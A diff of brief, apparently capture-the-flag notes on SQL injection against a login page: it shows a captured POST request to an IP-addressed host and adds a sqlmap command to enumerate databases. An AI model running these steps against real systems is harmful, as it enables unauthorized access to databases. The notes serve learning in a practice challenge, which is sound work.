@@ -3,6 +3,7 @@
 * on the login page try using ',' for username and password
 * Exposes the database MariaDB and admin table
 * use burbsuite to inetercept and capture the POST request save it in a file
+_________________________________
 POST /181444b73d/login HTTP/1.1
 Host: 35.190.155.168
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -16,3 +17,6 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 
 username=rr&password=ss
+__________________________________
+*use sqlmap to discover databases: "sqlmap -r /home/kali/Test --dbs --random-agent --thread 10"
+*once the dbs are discovered look for tables in the databases: 
